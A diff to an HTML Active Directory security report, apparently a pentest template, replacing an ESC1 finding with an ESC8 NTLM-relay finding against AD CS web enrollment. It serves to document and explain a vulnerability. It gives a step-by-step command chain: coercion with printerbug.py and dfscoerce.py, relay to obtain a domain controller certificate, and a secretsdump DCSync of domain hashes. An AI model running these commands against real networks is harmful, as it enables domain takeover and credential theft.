@@ -129,7 +129,7 @@
             <thead>
                 <tr>
                     <th class="risk-column">Risk</th>
-                    <th class="technique-column">Technique</a></th>
+                    <th class="technique-column">Issue</a></th>
                     <th class="category-column">Category</th>
                     <th class="score-column">Score</th>
                 </tr>
@@ -143,7 +143,7 @@
                 </tr>
                 <tr class="high">
                     <td>High</td>
-                    <td><a href="#esc1">ESC1</a></td>
+                    <td><a href="#esc1">ESC2</a></td>
                     <td>PKI</td>
                     <td>35</td>
                 </tr>
@@ -203,13 +203,13 @@
         <table>
             <thead>
                 <tr>
-                    <th class="table-header">Technique</th>
+                    <th class="table-header">Issue</th>
                     <th class="table-header">Risk</th>
                 </tr>
             </thead>
             <tbody>
                 <tr>
-                    <td class="toggle" id="esc1"><u>ESC1</u></td>
+                    <td class="toggle" id="esc1"><u>ESC8</u></td>
                     <td class="finding-riskcritical">Critical</td>
                 </tr>
                 <tr class="finding">
@@ -223,8 +223,7 @@
                                         <th>Score</th>
                                     </tr>
                                     <tr>
-                                        <td>Low privileged user can enroll in certificate template for authentication
-                                            and supply an arbitrary SAN</td>
+                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
                                         <td>T-15940</td>
                                         <td>+50</td>
                                     </tr>
@@ -239,11 +238,12 @@
                                     <tr>
                                         <td>PScustomobject info</td>
                                         <td>
-                                            <p>Enrolling in this certificate template allows low privileged users to
-                                                escalate their privileges to domain administrator by using a simple
-                                                python script</p>
+                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
+                                                The web enrollment interface (http://$CAserver/certsrv) is vulnerable to 'NTLM relay' attacks. 
+                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication to any low privileged user.</p>
                                             <p class="links"><b>Further information:</b></p>
-                                            <p><a href="https://example.com">Link 1</p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
                                         </td>
                                     </tr>
                                 </tbody>
@@ -257,35 +257,49 @@
                                         <td>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>1. Coercing machine authentication back to the attacking machine
-                                                        (192.168.10.130) can be done with printerbug.py or dfscoerce.py.
+                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
                                                     </p>
-                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
-                                                        192.168.10.130</p>
-                                                    <p class="code">python3 dfscoerece.py -u test -p 'Password123!' -d test.local
-                                                        192.168.10.130 192.168.18.141</p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ESC8/ESC-8.png"
+                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
                                                         alt="Image Description">
                                                 </span>
                                             </div>
                                             <hr>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>2. Authentication is then relayed to an unsecured certificate
-                                                        endpoint to obtain a pfx certificate for the domain controller.
-                                                        This is then used to replicate the behavior of a domain
-                                                        controller and replicate the contents of NTDS.dit via a DCSync.
+                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
+                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                     </p>
+                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
+                                                        192.168.10.130</p>
+                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
+                                                        192.168.10.130 192.168.18.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
+                                                        alt="Image Description">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
+                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
+                                                    </p>
+
                                                     <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                         DomainController</p>
+                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
                                                     <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
+                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
+                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                     <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                         :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ESC8/ESC8-1.png"
+                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                         alt="Image Description">
                                                 </span>
                                             </div>
